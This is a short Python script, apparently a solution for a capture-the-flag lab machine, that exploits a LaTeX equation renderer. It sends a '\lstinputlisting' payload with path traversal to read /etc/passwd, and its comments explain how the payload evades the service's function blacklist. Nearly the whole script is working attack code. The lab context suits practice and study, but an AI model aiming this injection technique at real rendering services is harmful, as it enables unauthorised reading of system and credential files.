#!/usr/bin/python3

import requests
from PIL import Image
import io

# Exploiting LaTeX by sending this payload which basically bypasses the blacklist of functions one could use.
# By reading header.tex we see we can use the listing module which has the lstinputlisting function that is not blacklisted.
# By escaping the $ char by using another $ this seems to work.

def save_and_open_png(response, file_path):
    image_data = response.content
    image_buffer = io.BytesIO(image_data)
    image = Image.open(image_buffer)
    # image.save(file_path, "PNG")
    image.show()

payload = "$\\lstinputlisting{../../../../../etc/passwd}$"

url = f"http://latex.topology.htb//equation.php?eqn={payload}&submit="

response = requests.get(url)
print("Response.....")
print(response.text)
save_and_open_png(response, "./response_dump.png")